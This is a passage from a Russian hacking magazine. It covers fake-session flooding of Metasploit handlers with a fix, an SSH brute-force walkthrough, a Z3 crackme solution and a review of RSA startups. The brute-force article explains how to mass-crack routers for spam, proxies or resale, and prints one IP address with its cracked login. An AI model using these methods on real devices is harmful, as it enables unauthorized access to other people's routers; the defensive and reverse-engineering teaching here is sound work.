73.x.x.x:47054 (UUID: 2d40d9e9d8ee8c66/x86=1/windows=1/2015-
12-19T05:50:27Z) Redirecting stageless connection from /chpwd.htm
with UA ‘Wget/1.16 (linux-gnu)’

Есть и альтернативный способ. Мы можем запросить файл blank.php. Это ак-
туальный файл для listener, который представляет собой DLL-библиотеку.

$ wget --no-check-certificate https://666.666.666.666/blank.php
$ file blank.php: PE32 executable (DLL) (GUI) Intel 80386,
for MS Windows

Теперь в логах мы уже видим следующее:

[*] 73.x.x.x:10458 (UUID: 376988d5161359f3/x86=1/windows=1/2015-
12-19T04:44:20Z) Staging Python payload ...
[*] Meterpreter session 57 opened (192.168.1.1:65535 ->
73.x.x.x:10458) at 2015-12-19 04:44:20 +0000

Запрос файла blank.php триггерит скрипт на Python и открывает сессию
Meterpreter (правда, она неправильная и скоро будет закрыта).

[-] Meterpreter session 57 is not valid and will be closed

Лог самого Meterpreter подтверждает наличие ложной сессии. В итоге мы по-
лучаем DoS у handler, вызывая задержку между любой «правильной» полезной
нагрузкой и handler/listener.
  Помимо получения строки core_patch_url из chpwd.htm и бинарного blank.
php, мы можем найти много информации среди доступных файлов (см. скрин-
шоты).
                                                Список доступных файлов
                                                            у Meterpreter. Часть 1





                                                Список доступных файлов
                                                            у Meterpreter. Часть 2





Автор опубликовал исходники обоих скриптов:
•  скрипт для DoS;
•  скрипт для обнаружения.

Дополнительные подробности есть в статье автора эксплоита.

SOLUTION
По умолчанию listener сконфигурирован так, что разрешены все соединения с лю-
бым UUID полезной нагрузки. Установи IgnoreUnknownPayloads true в своем
скрипте или из консоли msfconsole переведи полезную нагрузку и listener
в Paranoid Mode. Подробности можешь найти в wiki фреймворка.
  Или настрой правила iptables:

iptables -I INPUT -p tcp -m tcp -s 0.0.0.0/0
   --dport $LISTENER_PORT -j DROP
iptables -I INPUT -p tcp -m tcp -s $SHELL_IP
   --dport $LISTENER_PORT -j ACCEPT
iptables -L
 ВЗЛОМ
РОУТЕР
ПОД УГРОЗОЙ
              СТАРОЕ РАЗВЛЕЧЕНИЕ
              НА НОВЫЙ ЛАД:
            МАССОВЫЙ БРУТ SSH





                                                                   Денис Колисниченко
                                                                                         dhsilabs@gmail.com
В отличие от полноценных серверов, где обычно на-
строены PAM (Pluggable Authentication Modules), ко-
торые ограничат доступ к серверу на определен-
ное в конфиге время после нескольких (как правило,
трех-пяти) неудачных попыток входа, в роутере Линукс
обрезанный. PAM на нем нет, поэтому ничто не меша-
ет его брутить. И эта идея — брут и захват роутеров —
можно сказать, снова в тренде!

НАША ЦЕЛЬ — ТВОЙ РОУТЕР
Зачем нужно захватывать роутер? Это зависит от фантазии хакера: можно ис-
пользовать его для рассылки спама, сделать из него приватный сокс (прокси).
А можно продать полученный доступ — стоит это удовольствие, со слов одного
моего знакомого, до 200 долларов в месяц, и этот товар пользуется изрядной
популярностью.

СКАНИРУЕМ РОУТЕРЫ
Для получения доступа хакеры ис-
пользуют простую, но эффектив-
ную программулину Tunnel Scanner.
Параметр Type задает тип скани-
рования: по статическому логину,
по статическому паролю, по списку
логинов/паролей. Третий вариант
(By Login;Password List), как прави-
ло, самый эффективный.
  Параметр Static позволяет за-
дать диапазон IP-адресов, кото-
рый  будет  сканироваться. Если
включить чекбокс IP ranges from
file, то диапазон IP-адресов бу-
дет браться из файла, указанного
в поле IP ranges (по умолчанию это
файл с именем ip.txt). Диапазо-
ны в нем указываются, как показа-                                            Рис. 1. Программа Tunnel Scanner в работе
но на рис. 2.
                                                             Рис. 2.
                                                  Файл ip.txt — диапазоны
                                                           IP-адресов





Список логинов и паролей задается параметром Login;Password. По умолча-
нию он берется из файла words.txt (рис. 3). Конечно, на рис. 3 список довольно
убогий, но, думаю, в Сети ты без проблем найдешь более продвинутый (или
можно проявить смекалку и создать свой).


  Рис. 3.
  Список логинов
  и паролей





Параметр Threads задает количество одновременных потоков для брута.
По умолчанию используется значение 900 — этого более чем достаточно. Па-
раметр Timeout определяет тайм-аут в секундах между попытками.
   Что ж, осталось нажать кнопку Start. Программа в работе изображена на рис.
1. Как видишь, мы уже получили первые результаты. Проанализируем их:
[1] 37.112.128.160 -  failed to connect
[5] 37.112.128.164 -  checking admin;admin
[4] 37.112.128.163 -  failed to connect
[3] 37.112.128.162 -  failed to connect
[6] 37.112.128.165 -  failed to connect
[2] 37.112.128.161 -  failed to connect
[5] 37.112.128.164 -  [-]: admin;admin
[5] 37.112.128.164 -  checking support;support
[5] 37.112.128.164 -  [-]: support;support
[5] 37.112.128.164 -  checking root;123456
[5] 37.112.128.164 -  [-]: root;123456
[5] 37.112.128.164 -  checking ubnt;ubnt
[5] 37.112.128.164 -  [-]: ubnt;ubnt
[5] 37.112.128.164 -  checking ftp;123456
[5] 37.112.128.164 -  [+]: ftp;123456
…

Номер в квадратных скобках — это номер потока (для нас он не имеет значения).
Далее указывается сканируемый IP-адрес. Строка failed to connect означает,
что порт SSH закрыт — или совсем, или для нас (брандмауэром). Строка вида
[-]: admin;admin сообщает, что SSH-порт открыт, однако пароль и/или логин
не подошел. А вот аналогичная строка с + говорит, что все удалось:

[5] 37.112.128.164 -  [+]: ftp;123456

Это значит, что на машине с IP 37.112.128.164 крутится SSH, войти в систему
можно, используя логин ftp и пароль 123456.
   Результаты последнего удачного сканирования заносятся в файл brute_
good.txt. С этим файлом нужно быть очень осторожным — программа пере-
записывает его при каждом нажатии кнопки Scan. Поэтому после каждого «уло-
ва» нужно делать бэкап этого файла.


                                                                 Рис. 4.
                                                               Результат удачного
                                                           сканирования
                                                            записывается в файл
                                                                     brute_good.txt
Напоследок привожу еще два скрина — сканирование диапазона 37.112.
128.100–37.112.128.164. Обрати внимание на рис. 5 — на скольких компах
в этом диапазоне есть SSH. Сообщений «failed to connect» очень мало. Улов
этого сканирования изображен на рис. 6.


  Рис. 5.
  Сканируем
  заданный
  диапазон





                                                             Рис. 6. «Улов» сканера
Сколько можно так насобирать? Знакомый говорит, что за один день можно
получить до 13 000 строк логин/пароль. Это очень много и говорит о том, что
даже в наши дни с безопасностью на многих роутерах все запущено.

КТО БРУТИТ?
Согласно данным atlas.arbor.net, за последние 24 часа брут SSH был вто-
рой по популярности атакой в мире (рис. 7).





  Рис. 7. Статистика атак


Откуда же исходит угроза? По той же статистике за сутки (сегодня у меня 10
марта 2016 года), чаще всего источник угрозы находится в США, на втором
месте — Китай. Конечно, IP-адрес можно изменить, но не думаю, что китайцы
особо заморачиваются с этим. На рис. 8 приведена статистика по всем угро-
зам, а на рис. 9 — только по SSH-атакам.





  Рис. 8. Источники угроз за сутки (все угрозы) (начало)
Рис. 8. Источники угроз за сутки (все угрозы) (окончание)





Рис. 9. Источники SSH-атак за сутки
КАК ЗАЩИТИТЬ РОУТЕР?
Есть четыре простых способа:
1. Роутер настраивается не так часто, и изменять его параметры приходится
   (после первоначальной настройки) еще реже. Поэтому можно просто от-
   ключить SSH. По большому счету он там не особо нужен. Можно включать
   его только на определенные дни, например когда ты в отпуске и может по-
   надобиться твое вмешательство. Хотя, как правило, роутеры настраиваются
   по принципу «установил и забыл», но все же.

2. Если SSH нужен, тогда следует изменить его порт. Все подобные рассмо-
   тренному сканеры проверяют 22-й порт. Они не сканируют все порты узла.
   Конечно, если захотят пробрутить именно твой роутер, то сканером портов
   заветный порт будет очень быстро вычислен. Но если нужен любой роутер,
   то будут сканировать только порт 22.

3. Используй сложные пароли. Даже если программа найдет твой SSH-порт,
   вряд ли она сможет подобрать пароль вроде v8KL2BuCLbcySua.

4. Настрой брандмауэр так, чтобы доступ к порту SSH разрешался только
   из определенной подсетки (например, из твоей домашней подсетки —
   не думаю, что в ней живут миллионы китайцев, желающих пробрутить твой
  SSH :)).
ВЗЛОМ
MICROSOFT
ЛОМАЕТ
ПРОГИ
УЧИМСЯ РЕШАТЬ
CRACKME
ПРИ ПОМОЩИ
MICROSOFT Z3PY





     Иннокентий
     Сенновский
Недавно Microsoft опубликовала свой SMT-решатель
Z3. Давай попробуем разобраться, как можно приме-
нить этот инструмент в практических целях.

Сначала определимся с терминами и областью применения. SMT — это тео-
ремы специального вида, решаемые в конечных полях. Поскольку вся булева
арифметика, используемая в компьютерах, является арифметикой в конечном
поле, SMT хорошо подходит для описания программ. При помощи таких тео-
рем можно представить задачу crackme или условия, при которых реализуется
уязвимость в ПО.
  До публикации использовать Z3 было довольно неудобно. Приходилось
учить новый язык, а запустить решатель можно было только на сайте (кстати, там
же находится tutorial для тех, кто хочет выучить сам язык). Сейчас Z3 можно за-
пустить на своем компьютере, и к нему теперь доступны различные API (C, C++,
.NET, Java, Python), из которых мы будем использовать Z3Py — API для Python.

УСТАНАВЛИВАЕМ Z3
Начнем с установки. Любителям винды придется скачать Z3 с сайта, установить
и добавить поддиректорию z3/bin в переменные среды PATH и PYTHONPATH.
Линуксоидам нужно выполнить следующие команды:

mkdir z3
cd z3
git clone https://github.com/Z3Prover/z3
cd z3
python scripts/mk_make.py
cd build
make
sudo make install

Локальную документацию генерируем так:

sudo apt-get install doxygen
cd doc
python mk_api_doc.py

Документацию можно просмотреть, открыв файл doc/api/html/index.html.
   Проверим, все ли правильно установилось. Создаем файл z3example.py cо
следующим кодом:





Запускаем:

python z3example.py


ОСВАИВАЕМ Z3
Если все установилось правильно, то программа должна вывести:

Equation satisfiable
0x8944C944

Что делает этот код? Сначала мы создаем переменную а размером 32 бита,
значение которой мы хотим найти. Далее мы создаем две константы соответ-
ствующего размера. Потом мы инициализируем решатель. При помощи ме-
тода add добавляем в решатель правило: (b>>2)^a=c. Метод check запускает
решатель и возвращает значение sat в случае, если решение найдено. Метод
model возвращает модель со значениями, удовлетворяющими условию. Мо-
дель представляет собой хеш-таблицу, из которой можно получить значение
каждой переменной, переданной в решатель.
   Z3 поддерживает типы Bool, Int, BitVec, Array, Real, FP (floating point). Типы
Bool, Real и Int соответствуют своим названиям. Тип BitVec — это по сути без-
знаковое число с определяемым в битах размером. Тип Array позволяет опре-
делить типы индексатора и элементов, FP — задать количество битов под экс-
поненту и мантиссу.
  Примеры инициализации:





Что такое Sort? Так в Z3 называется тип. Очевидно, IntSort() возвращает тип
Int, BoolSort() тип Bool и так далее. Узнать тип переменной можно при помо-
щи метода sort. Например:





Для типа FP существуют наследственные типы с определенными размерами
(Float16/FloatHalf, Float32/FloatSingle, Float64, Float128).
  Все типы, кроме Array, можно определять сразу для нескольких перемен-
ных. Достаточно добавить к методу суффикс s:


Для всех типов, кроме Array, можно создавать константы. Чтобы инициализи-
ровать константу, достаточно добавить к имени типа слово Val и передать ей
необходимое значение в качестве первого аргумента. Например:


Для всех типов, кроме BitVec и Array, можно использовать константы без ини-
циализации:




Константы типа Real можно инициализировать рациональными числами.
При этом дробное представление сохранится.
   Z3 также позволяет создавать функции.
Метод ForAll позволяет определить значение функции для всех возможных зна-
чений аргумента. Функцию можно определить для отдельных аргументов, тогда
Z3 попробует определить функцию для всех значений:





Для повторения логики программы лучше всего использовать тип BitVec,
при помощи которого удобно эмулировать операции с регистрами. Он под-
держивает битовые сдвиги, вращение, операции и, или и исключающее  или.
У него есть одна особенность, из-за которой программа может не найти реше-
ние твоей проблемы. Операция >> определена в Z3Py не как логический сдвиг,
а как арифметический, то есть с переносом значения флага carry в верхний раз-
ряд. Для логического сдвига нужно использовать метод LShR. Для операций
битового вращения (rol, ror) есть методы RotateLeft и RotateRight.
  Напишем простую программу с этими операциями:





Тип BitVec можно представить в качестве знакового или беззнакового числа
при помощи методов as_signed_long и as_long соответственно. Если нужно пе-
ревести тип BitVec в Int внутри решателя, поможет процедура BV2Int. Кстати,
в нашем коде использовалась процедура RotateLeft со вторым аргументом 48
при размере вектора 32. Очевидно, его можно упростить. Решатель Z3 делает
это автоматически, но можно упростить код и самому при помощи процедуры
simplify:





som — это опция, раскладывающая сложные произведения в сумму. Чтобы
просмотреть все параметры функции simplify, необходимо вызвать функцию
help_simplify().
   Z3 позволяет использовать методы питона в качестве уравнений, что очень
удобно, если код, который ты попытаешься представить при помощи SMT, ис-
пользует циклы. Функция должна возвращать True, False или тип Z3 Bool. На вход
ей должны быть переданы только аргументы типов Z3. Например:
Исполняем:

python z3MethodExample.py
Satisfiable
[b = 1940355559, c = 19403555529, a = 46]


ЛОМАЕМ ТЕСТОВЫЙ КРАКМИ
При решении crackme удобно использовать сразу несколько функций. Напри-
мер, в одной реализовать проверку на символы английского алфавита, а в дру-
гой логику самого crackme. Допустим, у нас есть такой crackme:
Теперь пишем для него решение:
Запускаем:

>>> python z3SolveEasyCrackme.py
Serial: mozzWzzygztkhpll
>>> python easycrackme.py mozzWzzygztkhpll
Serial is valid

ЛОМАЕМ НАСТОЯЩИЙ КРАКМИ
В качестве практики применим Z3 к настоящему ZeroNights Crackme 2013. Ска-
чать его можно по ссылке (zip).
   Запускаем приложение, вводим почту и пароль.


                                                        Вводим почту
                                                          и пароль
1. Открываем IDA, запускаем поиск по тексту Fail.





                                                          Поиск по тексту Fail


2. Изучаем функцию. Это функция обработки всех событий приложения. Нам
   нужна только ветка проверки серийника.





  Ищем ветку...             ...проверки серийника

Видно, что процедура берет текст из текстбоксов, высчитывает длины строк
и передает сами строки и их размеры в функцию sub_4012D0, в зависимости
от результата которой приложение выдает месседжбокс с разным текстом. По-
смотрим, что происходит в этой функции.
  Функция
  sub_4012D0





В начале функции мы видим проверку размера одной из строк. Она долж-
на иметь длину 18. Значит, это наш пароль. После этого пароль проверяется
на символы цифр и латинского алфавита. Дальше мы видим, что почта переда-
ется в функцию sub_401000.


                                                              Вот он, вызов
                                                               sub_401000
В этой функции производится заполнение массива из 256 байт значениями
от 0 до 255.

                                                           Заполнение
                                                            массива





Далее массив перемешивается при помощи почты. Есть два счетчика, инициа-
лизированных нулями перед циклом. Первый проходит по значениям от 0 до 255.
Ко второму при каждой итерации прибавляется байт из замешиваемого массива
по смещению первого счетчика и прибавляется байт почты со смещением на пер-
вый счетчик по модулю длины почты. Потом элементы массива на номерах счетчи-
ков меняются местами. Значит, почта применяется для генерации sbox-массива.


                                                           Массив переме-
                                                             шивается
Вернемся в метод sub_4012D0. Мы видим инструкции, повторяемые для двух
частей пароля.


                                                                 Инструкции
                                                                для двух ча-
                                                                      стей пароля





Функция sub_401070 производит манипуляции над каждым символом пароля
по следующей формуле:

c[i]=sbox[c[i]-((c[i]>>4)<<3)&0xf]
                                                              Функция
                                                                   sub_401070





После этого каждая из обновленных частей копируется в соответствующий но-
вый массив, но со смещением в тройках, то есть:

b[0]=a[0];
b[1]=a[1];
b[2]=a[2];
b[3]=a[5];
b[4]=a[3];
b[5]=a[4];
b[6]=a[8];
b[7]=a[6];
b[8]=a[7];

После этих манипуляций происходит вызов функции sub_401170 и освобожде-
ние лишних массивов.
                                                        А вот и вызов
                                                               sub_401170





В этой функции происходит копирование второй части пароля в локальный
массив и цикл с множеством операций. После анализа цикла оказалось, что он
представляет собой перемножение двух квадратных матриц три на три по мо-
дулю семь. А то странное копирование со смещением — это сдвиг строки вле-
во на ее номер.


                                                          Странное копирова-
                                                        ние со смещением





Возвращаемся в предыдущую функцию. Теперь ясно, что следующие дей-
ствия — это сравнение результата с единичной матрицей.
                                                                Сравнение
                                                                      результата
                                                                         с единичной
                                                               матрицей





РЕЗУЛЬТАТ
Пишем решение crackme на Z3Py:

Может показаться, что программа зависла, но это не так. Sbox усложняет ра-
боту Z3, и в некоторых местах он скатывается на перебор, но все равно полу-
чается на порядки быстрее, чем прямой перебор по восемнадцати символам.
Получаем серийник:

Sat
Serial: FZFXgnJYheh6fbfgc6
Настало время проверить результаты. Вводим...


                                                                  Готово





Вуаля — ключ подошел. Поиск серийника занял у меня на ноутбуке примерно
пятнадцать минут.
ВЗЛОМ: Колонка Александра Полякова



Привет! Сегодня мы
поговорим о новых
стартапах в области ИБ.
Горячие инновационные
технологии прямиком
из Кремниевой долины
с конференции RSA
в Сан-Франциско!


РЫНОК
БЕЗОПАСНОСТИ
Каждый год в феврале-марте проходит самая значи-
мая конференция в индустрии безопасности — RSA.
Если каждому исследователю стоит хотя бы раз за-
глянуть на Black Hat, то каждый разработчик средств
защиты просто обязан присутствовать на RSA.

В этом году меня пригласили выступить с докладом, так что я с удовольстви-
ем поехал на RSA уже в третий раз. Масштабы конференции описать непро-
сто, но попробую. Это три огромных здания, заполненные людьми с бейджами,
и целый квартал вокруг. Судя по официальным данным, на RSA приезжают бо-
лее 30 тысяч человек, более 600 компаний присутствуют со стендами, пример-
но столько же проходит докладов, и все это только официальная часть.
   Вокруг конференции образовалась целая экосистема мини-ивентов и про-
сто вечеринок, количество которых перевалило за сотню. Все ближайшие кафе,
рестораны и клубы забиты битком с утра до вечера, а некоторые из них арендо-
ваны под мини-конференции различных вендоров.
   Забавная ситуация: если раньше каждая компания организовывала свою
вечеринку, то сейчас мелкие фирмы спонсируют вечеринки более крупных, что-
бы хоть как-то засветиться. Потому что даже если и сделать свою пати, то ве-
роятность, что на нее кто-то придет, мала (если, конечно,
не пригласить туда какую-нибудь суперзвезду). Так что в этом
году вполне можно увидеть вечеринку Rapid7 Sponsored by
Malwarebytes.

INNOVATION SANDBOX
На RSA, помимо всего прочего, уже много лет проводится                                                         INFO
конкурс Innovation Sandbox, в котором из сотен заявок выби-
                                                                            Подробностирают десять самых интересных проектов и дают их создате-                                                                           об участниках
лям по три минуты на выступление. Сегодня мы посмотрим,        и видео
что это за компании.                                                      выступлений
                  VERSA NETWORKS
                         Происхождение основателей: Индия
                            Число сотрудников: около 100
                           Дата основания: в районе 2012 года
                         Штаб-квартира: Санта-Клара, Калифорния
            Инвестиции: 57 миллионов (раунд А — 14 миллионов, раунд Б — 43 миллиона)
Когда парень из VERSA Networks вышел на сцену, первое, что я подумал, было:
«Как им вообще дали денег?» Презентационные скиллы для такого рода высту-
плений оказались гораздо ниже среднего. Я с трудом понял, что они вообще
предлагают и в чем их фишка (а это уже показатель).
  В общем, если очень приблизительно, то эти ребята поставляют виртуаль-
ные машины с полным набором средств сетевой безопасности уровней L3—L7.
Сюда входит все, начиная с межсетевого экрана и VPN и заканчивая IDS и по-
чтовыми фильтрами. Основная задача — избавить заказчиков от старинного
железа типа Cisco или Check Point. И, поскольку все приложения и операцион-
ные системы уходят в облако, есть смысл убрать в облако и все сопутствующее
железо, заменив его образами виртуалок.
   Мысль, конечно, разумная, но сдается мне, сейчас любой уважающий себя
вендор железок поставляет свои приложения IDS/IPS в виде виртуальных ма-
шин (Virtual Appliance). Так что вряд ли эти парни совершили такую уж револю-
цию. Им придется лоб в лоб столкнуться с гигантами рынка — Cisco, Check Point,
Palo Alto и прочими. Но выносить окончательный вердикт пока не будем — вдруг
неумение рассказывать помешало донести до публики что-то важное?


                      VERA
                        Происхождение основателей: Индия
                            Число сотрудников: неизвестно
                           Дата основания: в районе 2014 года
                         Штаб-квартира: Пало-Альто, Калифорния
             Инвестиции: 31 миллион (раунд А — 14 миллионов, раунд Б — 17 миллионов)

VERA — это, если коротко, «вера» в то, что можно возродить DRM (Digital Rights
Management) в новой упаковке. По словам основателей, самое главное в безо-
пасности — это данные. Сложно спорить: немалая часть ИБ основана на защи-
те данных. А решение, надо сказать, интересное. Ребята подумали: а что, если
вместо того, чтобы защищать данные в разных приложениях и сетях, просто
засунуть каждый элементарный кусок данных в некий виртуальный контейнер?
Так они пришли к мысли создать собственную мини-операционку с полным на-
бором секьюрити-настроек, начиная от шифрования и разграничения досту-
па и заканчивая мониторингом действий и возможностью отзыва прав в любой
момент.
  Самое главное, что все это работает, по словам основателей, без каких-ли-
бо дополнительных сложностей на всех устройствах. Верится с трудом, но су-
дить пока рано. Предусмотрены даже такие вещи, как вотермарки при распе-
чатке документов, так что, даже если произошла утечка, можно легко отследить,
кто именно распечатал документ. Скриншоты тоже так просто не сделать, в об-
щем, куча разных защит.
  Мой вывод: обойти многое из перечисленного так или иначе можно, но в це-
лом это на данный момент наиболее безопасное и удобное решение задачи
контроля данных. Естественно, включена полная поддержка всех облачных хра-
нилищ и навороченная система мониторинга и анализа того, кто кому какие
права отдал или, наоборот, кто у кого забрал. Я бы рекомендовал крупным ком-
паниям обратить внимание и как минимум потестировать.


                 SKYPORT SYSTEMS
                         Происхождение основателей: США
                               Число сотрудников: 80
                               Дата основания: 2013 год
                         Штаб-квартира: Маунтин-Вью, Калифорния
                               Инвестиции: 30 миллионов

В Skyport Systems создали якобы полностью безопасную платформу — на сво-
ем железе, со своим виртуализатором и ОС. А вот приложения здесь можно
запускать любые — этот механизм называется Virtual Applicances. Смысл всей
затеи в том, что мониторинг всего потока данных заранее встроен на всех уров-
нях приложения. Как бы ни атаковали виртуалки, которые запущены на Skyport,
и какие бы руткиты туда ни загружали, это всегда можно обнаружить.
   Подразумевается, что клиенты будут помещать в виртуальную машину кри-
тичные приложения. Это позволит мониторить весь входящий трафик с самого
нижнего уровня до уровня приложений и выявлять аномалии. Фирменная си-
стема мониторинга позволяет очень удобно визуализировать потоки трафика
и выявлять угрозы. Можно спуститься на самый низкий уровень и разобрать де-
тали.
   Пока что, конечно, многое нужно делать вручную, но главное, что есть плат-
форма. Когда у тебя, по сути, полный контроль над всем потоком данных, мож-
но достраивать самые разные методы обнаружения атак. В общем, очень инте-
ресная идея в качестве дополнения к существующим средствам. И компании, я
думаю, можно пророчить счастливое будущее.
                MENLO SECURITY
                     Происхождение основателей: США, Израиль
                             Число сотрудников: более 60
                               Дата основания: 2013 год
                         Штаб-квартира: Менло-Парк, Калифорния
            Инвестиции: 35 миллионов (раунд А — 10 миллионов, раунд Б — 25 миллионов)
Итак, есть проблема, а точнее две проблемы. Первая — это атаки на корпора-
тивных пользователей из интернета, чаще всего через сайты с вредоносным
кодом или зараженные почтовые вложения. Вторая проблема — это, наоборот,
все, что касается утечки важных данных с рабочей станции в интернет. Нынеш-
ние решения, по сути, сводятся к бесконечной игре в черные и белые списки.
Это приводит к сложностям с настройкой и огромному количеству ложных сра-
батываний, так что самое время придумать новый подход.
  Идея лежит на поверхности и уже была частично реализована компанией
Citrix: что, если мы будем открывать файлы не на своем компьютере, а в некоем
виртуальном пространстве на сторонней машине в облаке? Тогда не страшны
никакие зараженные файлы, и по интернету мы будем ходить не у себя, а на уда-
ленной машине, которую нам не жалко. Технически это реализовано при по-
мощи их патентованного решения Menlo Security, которое называется Adaptive
Clientless Rendering. Смысл ясен из названия: пользователю передается пото-
ковое видео, а не настоящий интерфейс приложения.
   Звучит заманчиво, но, если я правильно понял, есть одна загвоздка: работа-
ет это только в режиме просмотра. Если, к примеру, нужно модифицировать до-
кумент, приложенный к письму, то для этого его придется все же скачать. Из-за
этого отчасти теряется смысл всей системы, но только отчасти. Ведь мы редко
вот так открываем документы, присланные незнакомцами, и начинаем сразу ре-
дактировать. Так что определенную часть угроз таким способом отразить мож-
но, и это уже огромный шаг. Ну и самое главное: все работает абсолютно про-
зрачно с пользовательской точки зрения. Так что пятерка за удобство и четыре
с плюсом за безопасность. Неплохой балл, скажу я вам!


                   SAFEBREACH
                       Происхождение основателей: Израиль
                             Число сотрудников: более 30
                               Дата основания: 2014 год
                          Штаб-квартира: Саннивейл, Калифорния
                                Инвестиции: 4 миллиона

Эти парни покусились на святое: решили заменить пентестеров софтом! Идея
заключается в постоянном мониторинге возможности совершения различных
атак через цепочки уязвимостей в корпоративной инфраструктуре. Но это толь-
ко звучит красиво, а на деле система состоит из простейшего сканера уязви-
мостей, который снабжен возможностью строить цепочки атак.
  Я бы не стал ждать, что такое решение даст охват, схожий с тем, что дают
существующие сканеры уязвимостей, — в них вот уже десять лет кропотливо
добавляют разнообразные проверки. Гораздо лучше было бы использовать
связку из сканера уязвимостей и платформы для анализа рисков. К примеру,
Skybox или RedSeal консолидируют все уязвимости и показывают цепочки атак.
   Технология SafeBreach похожа на некий урезанный вариант подобного ре-
шения, но работает в режиме онлайн. Еще она постоянно мониторит и еже-
секундно отображает информацию о возможных способах проведения атак.
За эту непрерывность можно поставить разработчикам плюсик, но вряд ли это
решение изменит все и заменит ту связку, что я предложил чуть выше.
  Тем не менее кое-где разработка SafeBreach может пригодиться. Напри-
мер, если нужно не раз в месяц проверять сто процентов уязвимостей и атак
через сложную интеграцию, а отслеживать пятую часть этих проблем, зато в он-
лайновом режиме. Своих покупателей этот продукт найдет, но говорить о ре-
волюции я бы не стал. Забавно, что это уже не первая компания из Израиля,
которая предлагает такое решение. Сканеры уязвимостей, мол, это не то, а вот
наш агент — имитатор пентестера, который работает 24/7, — это ваше спасе-
ние. Посмотрим, удастся ли одурачить этим массовый рынок.


                        ILLUSIVE
                       Происхождение основателей: Израиль
                               Число сотрудников: 50
                               Дата основания: 2014 год
                               Штаб-квартира: Нью-Йорк
             Инвестиции: 27 миллионов (раунд А — 5 миллионов, раунд Б — 22 миллиона)

И снова израильские предприниматели берут старую идею, красиво упаковы-
вают и подают как инновационный продукт, но в этот раз у него и правда есть
хорошие шансы на успех. Компания возродила старую идею ханипотов, только
значительно упростила ее использование. Смысл в том, что на каждый объект
сети, будь то рабочая станция, сервер или сетевое оборудование, создается
по две его виртуальные копии.
  Даже если хакер попал на один из настоящих хостов, шансы получить доступ
к следующему реальному хосту — один к трем; еще к одному — снова один
к трем, и так далее. Таким образом, чем дальше он проникает, тем быстрее рас-
тет вероятность того, что его обнаружат, — достаточно нарваться лишь на один
поддельный хост.
   Заказчик также получает платформу для мониторинга аномальной активно-
сти и инструмент для расследования инцидентов. Идея кажется мне многоо-
бещающей (я всегда испытывал страсть к ханипотам!), и пока что это самая
лучшая реализация идеи из того, что я видел. К сожалению, я не знаю подроб-
ностей о том, как реализована технология и как она защищена от обнаружения,
но постараюсь выяснить.


                       BASTILLE
                         Происхождение основателей: США
                             Число сотрудников: более 40
                               Дата основания: 2014 год
                            Штаб-квартира: Атланта, Джорджия
   Инвестиции: 11,5 миллиона (посевной — 1,5 миллиона, раунд А — 1 миллион, раунд Б — 9 миллионов)

А вот наконец и кое-что действительно новенькое. Речь идет о безопасности
интернета вещей (Internet of Things). Предпосылка такова: разнообразные
устройства обмениваются данными по беспроводным сетям, а значит, и безо-
пасность должна строиться на прослушивании трафика, проходящего по раз-
личным диапазонам беспроводных сетей, а также его анализа на предмет по-
тенциальных угроз и аномалий.
   Если кто не в курсе, то, помимо Wi-Fi и Bluetooth, которые нам давно из-
вестны, есть не менее десятка других беспроводных протоколов: ZigBee,
DECT, Z-Wave, nRF24 или, к примеру, промышленный WirelessHART. Парни
из Bastille предлагают устройства, которые слушают разные частоты, анали-
зируют на наличие нелегитимных устройств, выявляют потенциальные атаки
и показывают все это на карте.


                   PROTECTWISE
                         Происхождение основателей: США
                             Число сотрудников: более 60
                               Дата основания: 2013 год
                            Штаб-квартира: Денвер, Колорадо
                                Инвестиции: 54 миллиона

Ушлые ребята из ProtectWise предлагают своим клиентам поставить на все се-
тевые девайсы сенсоры, которые упаковывают трафик и отсылают в облако.
Там данные разбираются на 4000 протоколов, и отображается разноцветная
статистика. Но даже невооруженным взглядом видно, что нет там никакого глу-
бокого анализа и не будет. Недостаточно у них хороших инженеров.
   Компания сделана для быстрой продажи какому-нибудь большому игроку
вроде Cisco, где красивую мордочку приклеят к реальному анализатору, а аген-
ты встроят в маршрутизаторы, и тогда, возможно, все будут счастливы. Ну а пока
это чистой воды надувательство.
   Основатели сами не заинтересованы в реальном росте и контроле ситуации.
У компании уже пять инвесторов, которые имеют четыре из шести голосов в сове-
те директоров, — есть даже шанс, что основателям вообще ничего не достанет-
ся. Впрочем, может, они на это и не рассчитывают, а просто собираются пожить
пять лет на неплохие зарплаты, поддерживая видимость бурной деятельности.
  Я вообще считаю, что это фейк. Расписано спасение от всех бед, а по факту
мы имеем только красивый дашборд в стиле фильмов про хакеров, где кто-ни-
будь с умным видом залипает в экран с разноцветными индикаторами.


                     PREVOTY
                         Происхождение основателей: США
                             Число сотрудников: более 30
                               Дата основания: 2013 год
                        Штаб-квартира: Лос-Анджелес, Калифорния
            Инвестиции: 10,5 миллиона (раунд А — 2,4 миллиона, раунд Б — 8,5 миллиона)

Встречайте супермодную тему в Application Security — она называется RASP
(Real Time Application Protection). В какой-то момент исследователи решили,
что вместо анализа безопасности кода проще будет встроить некий файрвол
уровня приложений прямо в API языка или в виртуальную машину .NET или Java,
а потом отслеживать все небезопасные запросы, которые приводят к XSS или
к SQL injection. В дополнение к этому у вас появляется дашборд, где можно
увидеть статистику всех запросов к API и потенциальные атаки, которые можно
там же и предотвратить.
   У меня по этой теме только один вопрос: если мы должны использовать како-
е-то левые API, то не проще ли сразу безопасно код писать и переменные сани-
тайзить? И пока мне ни один вендор RASP на это уверенно не ответил. RASP —
тема сама по себе уже не новая, практически все серьезные компании, которые
занимаются анализом кода, имеют подобные системы или работают над ними.
Думаю, в каком-нибудь из следующих выпусков я расскажу об этом подробнее.


                   PHANTOM
                         Происхождение основателей: США
                             Число сотрудников: около 20
                               Дата основания: 2014 год
                           Штаб-квартира: Вудсайд, Калифорния
            Инвестиции: 9,2 миллиона (раунд А — 2,7 миллиона, раунд Б — 6,5 миллиона)

Встречаем заслуженного победителя — компанию Phantom. На удивление —
это самая маленькая фирма из всех перечисленных и практически с самыми ма-
ленькими инвестициями по сравнению с остальными представленными старта-
пами. За что же им дали приз на престижнейшем конкурсе Innovation Sandbox?
   Представь, что ты отвечаешь за безопасность в огромной компании и у тебя
десятки разных средств защиты, начиная от файрволов и заканчивая система-
ми инцидент-менеджмента. Твоя задача — оптимизировать процессы и время
реагирования. Phantom — это фреймворк, который знает API практически всех
ключевых решений в области ИБ, на его основе можно делать скрипты. Ну на-
пример, есть подозрение, что найдена малварь. Скрипт отправит файл на про-
верку в VirusTotal, проанализирует в сандбоксе и, если малварь действительно
будет обнаружена, создаст запись об инциденте и дальше начнет реализовы-
вать контрмеры — к примеру, блокировку действий с зараженного хоста. А те-
